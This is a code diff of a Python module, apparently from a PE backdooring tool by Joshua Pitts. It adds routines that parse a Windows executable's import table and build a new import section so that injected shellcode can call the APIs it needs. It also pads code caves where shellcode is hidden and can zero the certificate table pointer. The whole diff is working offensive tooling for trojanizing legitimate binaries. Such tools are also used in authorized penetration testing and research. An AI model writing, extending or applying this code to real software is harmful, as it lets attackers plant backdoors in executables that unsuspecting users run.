@@ -1,6 +1,5 @@
 '''
-
-Copyright (c) 2013-2014, Joshua Pitts
+Copyright (c) 2013-2015, Joshua Pitts
 All rights reserved.
 
 Redistribution and use in source and binary forms, with or without modification,
@@ -41,6 +40,7 @@ import time
 import subprocess
 import pefile
 from random import choice
+from winapi import winapi
 from intel.intelCore import intelCore
 from intel.intelmodules import eat_code_caves
 from intel.WinIntelPE32 import winI32_shellcode
@@ -143,7 +143,8 @@ class pebin():
     def gather_file_info_win(self):
         """
         Gathers necessary PE header information to backdoor
-        a file and returns a dict of file information called flItms
+        a file and returns a dict of file information called flItms.
+        Takes a open file handle of self.binary
         """
         #To do:
         #   verify signed vs unsigned
@@ -191,14 +192,11 @@ class pebin():
                                                                self.binary.read(4))[0]
         self.flItms['AddressOfEntryPoint'] = struct.unpack('<I', self.binary.read(4))[0]
         self.flItms['BaseOfCode'] = struct.unpack('<I', self.binary.read(4))[0]
-        #print 'Magic', self.flItms['Magic']
-        if self.flItms['Magic'] != int('20B', 16):
-            #print 'Not 0x20B!'
+        if self.flItms['Magic'] != 0x20B:
             self.flItms['BaseOfData'] = struct.unpack('<I', self.binary.read(4))[0]
         # End Standard Fields section of Optional Header
         # Begin Windows-Specific Fields of Optional Header
-        if self.flItms['Magic'] == int('20B', 16):
-            #print 'x64!'
+        if self.flItms['Magic'] == 0x20B:
             self.flItms['ImageBase'] = struct.unpack('<Q', self.binary.read(8))[0]
         else:
             self.flItms['ImageBase'] = struct.unpack('<I', self.binary.read(4))[0]
@@ -220,7 +218,7 @@ class pebin():
         self.flItms['CheckSum'] = struct.unpack('<I', self.binary.read(4))[0]
         self.flItms['Subsystem'] = struct.unpack('<H', self.binary.read(2))[0]
         self.flItms['DllCharacteristics'] = struct.unpack('<H', self.binary.read(2))[0]
-        if self.flItms['Magic'] == int('20B', 16):
+        if self.flItms['Magic'] == 0x20B:
             self.flItms['SizeOfStackReserve'] = struct.unpack('<Q', self.binary.read(8))[0]
             self.flItms['SizeOfStackCommit'] = struct.unpack('<Q', self.binary.read(8))[0]
             self.flItms['SizeOfHeapReserve'] = struct.unpack('<Q', self.binary.read(8))[0]
@@ -237,7 +235,10 @@ class pebin():
         # Begin Data Directories of Optional Header
         self.flItms['ExportTable'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['ImportTableLOCInPEOptHdrs'] = self.binary.tell()
-        self.flItms['ImportTable'] = struct.unpack('<Q', self.binary.read(8))[0]
+        #ImportTable SIZE|LOC
+        #self.flItms['ImportTable'] = struct.unpack('<Q', self.binary.read(8))[0]
+        self.flItms['ImportTableRVA'] = struct.unpack('<I', self.binary.read(4))[0]
+        self.flItms['ImportTableSize'] = struct.unpack('<I', self.binary.read(4))[0]
         self.flItms['ResourceTable'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['ExceptionTable'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['CertTableLOC'] = self.binary.tell()
@@ -245,7 +246,7 @@ class pebin():
 
         self.flItms['BaseReLocationTable'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['Debug'] = struct.unpack('<Q', self.binary.read(8))[0]
-        self.flItms['Architecutre'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero
+        self.flItms['Architecture'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero
         self.flItms['GlobalPrt'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['TLS Table'] = struct.unpack('<Q', self.binary.read(8))[0]
         self.flItms['LoadConfigTable'] = struct.unpack('<Q', self.binary.read(8))[0]
@@ -263,8 +264,7 @@ class pebin():
         self.flItms['Reserved'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero
         self.flItms['BeginSections'] = self.binary.tell()
 
-        if self.flItms['NumberOfSections'] is not 0:
-
+        if self.flItms['NumberOfSections'] is not 0 and 'Section' not in self.flItms:
             self.flItms['Sections'] = []
             for section in range(self.flItms['NumberOfSections']):
                 sectionValues = []
@@ -290,7 +290,7 @@ class pebin():
                 self.flItms['Sections'].append(sectionValues)
                 if 'UPX1'.lower() in sectionValues[0].lower():
                     print "[*] UPX packed, continuing..."
-                    
+
                 if ('.text\x00\x00\x00' == sectionValues[0] or
                    'AUTO\x00\x00\x00\x00' == sectionValues[0] or
                    'UPX1\x00\x00\x00\x00' == sectionValues[0] or
@@ -309,7 +309,6 @@ class pebin():
                                                self.flItms['textVirtualAddress'] +
                                                self.flItms['textPointerToRawData'] +
                                                self.flItms['LocOfEntryinCode_Offset'])
-
         else:
             self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -
                                                self.flItms['LocOfEntryinCode_Offset'])
@@ -320,49 +319,35 @@ class pebin():
         self.flItms['ImportTableALL'] = self.binary.read(self.flItms['BoundImportSize'])
         self.flItms['NewIATLoc'] = self.flItms['BoundImportLOCinCode'] + 40
 
+    def check_apis(self, aFile):
         ####################################
         #### Parse imports via pefile ######
-        self.binary.seek(0)
+
         #make this option only if a IAT based shellcode is selected
-        if 'iat' in self.SHELL:
+        if 'apis_needed' in self.flItms:
             print "[*] Loading PE in pefile"
-            pe = pefile.PE(self.FILE, fast_load=True)
-            #pe = pefile.PE(data=self.binary)
+            pe = pefile.PE(aFile, fast_load=True)
             print "[*] Parsing data directories"
             pe.parse_data_directories()
-
+            self.flItms['neededAPIs'] = set()
             try:
-                for entry in pe.DIRECTORY_ENTRY_IMPORT:
-                    #print entry.dll
-                    for imp in entry.imports:
-                        #print imp.name
-                        #print "\t", imp.name
-                        if imp.name is None:
-                            continue
-                        if imp.name.lower() == 'loadlibrarya':
-                            self.flItms['LoadLibraryAOffset'] = imp.address - pe.OPTIONAL_HEADER.ImageBase
-                            self.flItms['LoadLibraryA'] = imp.address
-                        if imp.name.lower() == 'getprocaddress':
-                            self.flItms['GetProcAddressOffset'] = imp.address - pe.OPTIONAL_HEADER.ImageBase
-                            self.flItms['GetProcAddress'] = imp.address
-                        ''' #save for later use
-                        if imp.name.lower() == 'createprocessa':
-                            print imp.name, hex(imp.address)
+                for api in self.flItms['apis_needed']:
+                    apiFound = False
+                    for entry in pe.DIRECTORY_ENTRY_IMPORT:
+                        for imp in entry.imports:
+                            if imp.name is None:
+                                continue
+                            if imp.name.lower() == api.lower():
+                                self.flItms[api + 'Offset'] = imp.address - pe.OPTIONAL_HEADER.ImageBase
+                                self.flItms[api] = imp.address
+                                apiFound = True
 
-                        if imp.name.lower() == 'waitforsingleobject':
-                            print imp.name, hex(imp.address)
+                    if apiFound is False:
+                        self.flItms['neededAPIs'].add(api)
 
-                        if imp.name.lower() == 'virtualalloc':
-                            print imp.name, hex(imp.address)
-
-                        if imp.name.lower() == 'connect':
-                            print imp.name, hex(imp.address)
-
-                        if imp.name.lower() == 'createthread':
-                            print imp.name, hex(imp.address)
-                        '''
             except Exception as e:
                 print "Exception:", str(e)
+            self.flItms['ImportTableFileOffset'] = pe.get_physical_by_rva(self.flItms['ImportTableRVA'])
 
         #####################################
 
@@ -407,6 +392,176 @@ class pebin():
             else:
                 self.binary.seek(32, 1)
 
+    def build_imports(self):
+
+        self.flItms['iatdict'] = {}
+        self.flItms['thunkSectionSize'] = 0
+        self.flItms['lenDLLSection'] = 0
+        self.flItms['iatTransition'] = 0
+        self.flItms['dllCount'] = 0
+        self.flItms['apiCount'] = 0
+        #The new section has three areas:
+        #DLL names [DLL NAME][0x00] * Number of DLLs
+        #thunkSection:
+        #DLL1 THunk1: 0x11223344
+        #DLL1 Thunk2: 0x11223355 0x00000000
+        #DLL2 THunk1: 0x11223366
+        #DLL2 Thunk2: 0x11223377 0x00000000
+        #repeat thunkSection
+        #each address for the thunk points to the API in the next section
+        #[0x0000][DLL1 API1 NAME][0x00]
+        #[0x0000][DLL1 API2 NAME][0x00]
+
+        for api in self.flItms['neededAPIs']:
+            print "[!] Adding %s Thunk in new IAT" % api
+            #find DLL
+            for aDLL, exports in winapi.winapi.iteritems():
+                if aDLL not in self.flItms['iatdict'] and api in exports:
+                    self.flItms['lenDLLSection'] += len(aDLL) + 1
+                    self.flItms['iatdict'][aDLL] = {api: 0}
+                    if self.flItms['Magic'] == 0x20B:
+                        self.flItms['thunkSectionSize'] += 16
+                    else:
+                        self.flItms['thunkSectionSize'] += 8
+                    self.flItms['iatTransition'] += 20
+                    self.flItms['dllCount'] += 1
+                if api in exports:
+                    #print aDLL, "has the api", api
+                    self.flItms['iatdict'][aDLL][api] = 0
+                    if self.flItms['Magic'] == 0x20B:
+                        self.flItms['thunkSectionSize'] += 16
+                    else:
+                        self.flItms['thunkSectionSize'] += 8
+                    self.flItms['apiCount'] += 1
+
+        #build first structure
+
+        firstStructure = ''
+        dllLen = 0
+        sectionCount = 0
+        for aDLL, api in self.flItms['iatdict'].iteritems():
+            firstStructure += struct.pack("<I", (self.flItms['dllCount'] * 20 + self.flItms['lenDLLSection'] +
+                                                 (self.flItms['thunkSectionSize'] / 2) +
+                                                 self.flItms['BeginningOfNewImports'] + 20 + sectionCount))
+            firstStructure += (struct.pack("<Q", 0x000000000))
+            firstStructure += struct.pack("<I", (self.flItms['dllCount'] * 20 +
+                                                 self.flItms['BeginningOfNewImports'] + 20 + dllLen))
+            firstStructure += struct.pack("<I", (self.flItms['dllCount'] * 20 + self.flItms['lenDLLSection'] +
+                                                 self.flItms['BeginningOfNewImports'] + 20 + sectionCount))
+            dllLen = len(aDLL) + 1
+            sectionCount += 16
+
+        firstStructure += struct.pack("<QQI", 0x0, 0x0, 0x0)
+        self.flItms['iatTransition'] = firstStructure
+
+        #build the transition section:
+        #For each DLL in the New Import Table
+        #   1. 1st Address points to the 2nd Thunk grouping's 1st DLL API Address
+        #   2. 8 bytes of 00's
+        #   3. Address points to the DLLName
+        #   4. Address points to the 1st API thunk address group for the DLL API Address
+        #20 bytes of 00's
+        # Figure all the size of this structure
+        # Work backwards to populate
+        #populate thunks
+
+        newDLLSection = ''
+        newthunkSection = ''
+        newapiNameSection = ''
+
+        apiOffset = (self.flItms['lenDLLSection'] + self.flItms['thunkSectionSize'] +
+                     self.flItms['BeginningOfNewImports'] + len(self.flItms['iatTransition']))
+        for aDLL, api in self.flItms['iatdict'].iteritems():
+            newDLLSection += aDLL + struct.pack("!B", 0x0)
+            for apiName, address in api.iteritems():
+                newapiNameSection += struct.pack("<H", 0x0) + apiName + struct.pack("<B", 0x0)
+                api[apiName] = apiOffset
+                if self.flItms['Magic'] == 0x20B:
+                    newthunkSection += struct.pack("<Q", apiOffset)
+                else:
+                    newthunkSection += struct.pack("<I", apiOffset)
+                apiOffset += len(apiName) + 3
+            if self.flItms['Magic'] == 0x20B:
+                newthunkSection += struct.pack("<Q", 0x0)
+            else:
+                newthunkSection += struct.pack("<I", 0x0)
+
+        newthunkSection += newthunkSection
+        self.flItms['addedIAT'] = self.flItms['iatTransition'] + newDLLSection + newthunkSection + newapiNameSection
+
+    def create_new_iat(self):
+        """
+        Creates new import table for missing imports in a new section
+        """
+        print "[*] Adding New Section for updated Import Table"
+
+        with open(self.flItms['backdoorfile'], 'r+b') as self.binary:
+            self.flItms['NewSectionSize'] = 0x1000
+            self.flItms['SectionName'] = 'rdata1'  # less than 7 chars
+            #Not the best way to find the new section (update for appending when fix found)
+            #newSetionPointerToRawData == last section pointer_to_rawdata and virtualsize
+            self.flItms['newSectionPointerToRawData'] = self.flItms['Sections'][-1][3] + self.flItms['Sections'][-1][4]
+            self.flItms['VirtualSize'] = self.flItms['NewSectionSize']
+            self.flItms['SizeOfRawData'] = self.flItms['VirtualSize']
+            self.flItms['NewSectionName'] = "." + self.flItms['SectionName']
+            self.flItms['newSectionFlags'] = int('C0000040', 16)
+            self.binary.seek(self.flItms['pe_header_location'] + 6, 0)
+            self.binary.write(struct.pack('<H', self.flItms['NumberOfSections'] + 1))
+            self.binary.seek(self.flItms['SizeOfImageLoc'], 0)
+            self.flItms['NewSizeOfImage'] = (self.flItms['VirtualSize'] +
+                                             self.flItms['SizeOfImage'])
+            self.binary.write(struct.pack('<I', self.flItms['NewSizeOfImage']))
+            self.binary.seek(self.flItms['BoundImportLocation'])
+            if self.flItms['BoundImportLOCinCode'] != 0:
+                self.binary.write(struct.pack('<I', self.flItms['BoundImportLOCinCode'] + 40))
+            self.binary.seek(self.flItms['BeginSections'] +
+                             40 * self.flItms['NumberOfSections'], 0)
+            self.binary.write(self.flItms['NewSectionName'] +
+                              "\x00" * (8 - len(self.flItms['NewSectionName'])))
+            self.binary.write(struct.pack('<I', self.flItms['VirtualSize']))
+            self.binary.write(struct.pack('<I', self.flItms['SizeOfImage']))
+            self.binary.write(struct.pack('<I', self.flItms['SizeOfRawData']))
+            self.binary.write(struct.pack('<I', self.flItms['newSectionPointerToRawData']))
+            if self.VERBOSE is True:
+                print 'New Section PointerToRawData'
+                print self.flItms['newSectionPointerToRawData']
+            self.binary.write(struct.pack('<I', 0))
+            self.binary.write(struct.pack('<I', 0))
+            self.binary.write(struct.pack('<I', 0))
+            self.binary.write(struct.pack('<I', self.flItms['newSectionFlags']))
+            self.binary.write(self.flItms['ImportTableALL'])
+
+            self.binary.seek(self.flItms['ImportTableFileOffset'], 0)
+            #-20 here
+            self.flItms['Import_Directory_Table'] = self.binary.read(self.flItms['ImportTableSize'] - 20)
+            self.binary.seek(self.flItms['newSectionPointerToRawData'], 0)  # moving to end of file
+            #test write
+            self.binary.write(self.flItms['Import_Directory_Table'])
+            #Add new imports
+            self.flItms['BeginningOfNewImports'] = self.flItms['SizeOfImage'] + len(self.flItms['Import_Directory_Table'])
+            self.build_imports()
+            #and remove here
+            #self.binary.seek(-20, 1)
+            self.binary.write(self.flItms['addedIAT'])
+            self.binary.write(struct.pack("<B", 0x0) * (self.flItms['NewSectionSize'] -
+                              len(self.flItms['addedIAT']) - len(self.flItms['Import_Directory_Table']) + 20))
+            self.binary.seek(self.flItms['ImportTableLOCInPEOptHdrs'], 0)
+            self.binary.write(struct.pack('<I', self.flItms['SizeOfImage']))
+            self.binary.write(struct.pack("<I", (len(self.flItms['Import_Directory_Table']) + self.flItms['apiCount'] * 8)))
+            self.binary.seek(0)
+            #For trimming File of cert (if there)
+            #temp_File = self.binary.read(self.flItms['newSectionPointerToRawData'] + self.flItms['NewSectionSize'])
+
+        #with open(self.flItms['backdoorfile'], 'w') as f:
+        #    f.write(temp_File)
+        #    temp_File = ''
+
+        #get file data again
+        with open(self.flItms['backdoorfile'], 'r+b') as self.binary:
+            self.gather_file_info_win()
+
+        return True
+
     def create_code_cave(self):
         """
         This function creates a code cave for shellcode to hide,
@@ -423,7 +578,7 @@ class pebin():
         self.flItms['NewSectionName'] = "." + self.flItms['SectionName']
         self.flItms['newSectionFlags'] = int('e00000e0', 16)
         self.binary.seek(self.flItms['pe_header_location'] + 6, 0)
-        self.binary.write(struct.pack('<h', self.flItms['NumberOfSections'] + 1))
+        self.binary.write(struct.pack('<H', self.flItms['NumberOfSections'] + 1))
         self.binary.seek(self.flItms['SizeOfImageLoc'], 0)
         self.flItms['NewSizeOfImage'] = (self.flItms['VirtualSize'] +
                                          self.flItms['SizeOfImage'])
@@ -545,7 +700,6 @@ class pebin():
         #BeginCave=0
         caveTracker = []
         caveSpecs = []
-
         self.binary.seek(0)
 
         while True:
@@ -560,8 +714,9 @@ class pebin():
                 count += 1
             else:
                 if count >= SIZE_CAVE_TO_FIND:
-                    caveSpecs.append(BeginCave)
-                    caveSpecs.append(Tracking)
+                    #Add a four byte buffer between objects
+                    caveSpecs.append(BeginCave + 4)
+                    caveSpecs.append(Tracking - 4)
                     caveTracker.append(caveSpecs)
                 count = 1
                 caveSpecs = []
@@ -569,7 +724,6 @@ class pebin():
             Tracking += 1
 
         pickACave = {}
-
         for i, caves in enumerate(caveTracker):
             i += 1
             for section in self.flItms['Sections']:
@@ -772,17 +926,29 @@ class pebin():
         self.flItms['stager'] = False
         self.flItms['supplied_shellcode'] = self.SUPPLIED_SHELLCODE
 
-        theResult = self.set_shells()
-
-        if theResult is False or self.flItms['allshells'] is False:
+        #pulling apis
+        if self.check_shells() is False:
             return False
 
         #Creating file to backdoor
         self.flItms['backdoorfile'] = self.OUTPUT
         shutil.copy2(self.FILE, self.flItms['backdoorfile'])
 
+        if 'apis_needed' in self.flItms:
+            self.check_apis(self.FILE)
+            if self.flItms['neededAPIs'] != set():
+                #ADD new section with IAT here, then patch that binary.
+                self.create_new_iat()
+                print "[*] Checking updated IAT for thunks"
+                self.check_apis(self.flItms['backdoorfile'])
+
         self.binary = open(self.flItms['backdoorfile'], "r+b")
+
+        if self.set_shells() is False or self.flItms['allshells'] is False:
+            return False
+        
         #reserve space for shellcode
+
         targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
         # Finding the length of the resume Exe shellcode
         if self.flItms['Magic'] == int('20B', 16):
@@ -884,14 +1050,13 @@ class pebin():
                     self.binary.write(self.flItms['completeShellcode'])
 
         #Patch certTable
-        if self.ZERO_CERT is True:
+        if self.ZERO_CERT is True and self.flItms['CertificateTable'] != 0:
             print "[*] Overwriting certificate table pointer"
             self.binary.seek(self.flItms['CertTableLOC'], 0)
             self.binary.write("\x00\x00\x00\x00\x00\x00\x00\x00")
 
-        print "[*] {0} backdooring complete".format(self.FILE)
-
         self.binary.close()
+
         if self.VERBOSE is True:
             self.print_flItms(self.flItms)
 
@@ -904,11 +1069,10 @@ class pebin():
         if not self.OUTPUT:
             self.OUTPUT = os.path.basename(self.FILE)
 
-    def set_shells(self):
+    def check_shells(self):
         """
-        This function sets the shellcode.
+        checks shellcode selection
         """
-        print "[*] Looking for and setting selected shellcode"
 
         avail_shells = []
 
@@ -931,6 +1095,7 @@ class pebin():
                 else:
                     print "   {0}".format(item)
             return False
+
         if self.SHELL not in dir(self.flItms['bintype']):
             print "The following %ss are available: (use -s)" % str(self.flItms['bintype']).split(".")[1]
             for item in dir(self.flItms['bintype']):
@@ -944,11 +1109,22 @@ class pebin():
                     avail_shells.append(item)
             self.flItms['avail_shells'] = avail_shells
             return False
+        getattr(self.flItms['bintype']("127.0.0.1", 8080, self.SUPPLIED_SHELLCODE), self.SHELL)(self.flItms, self.flItms['CavesPicked'])
+
+    def set_shells(self):
+        """
+        This function sets the shellcode.
+        """
+        print "[*] Looking for and setting selected shellcode"
+
+        if self.check_shells() is False:
+            return False
         #else:
         #    shell_cmd = self.SHELL + "()"
         self.flItms['shells'] = self.flItms['bintype'](self.HOST, self.PORT, self.SUPPLIED_SHELLCODE)
         self.flItms['allshells'] = getattr(self.flItms['shells'], self.SHELL)(self.flItms, self.flItms['CavesPicked'])
         self.flItms['shellcode'] = self.flItms['shells'].returnshellcode()
+        return True
 
     def injector(self):
         """
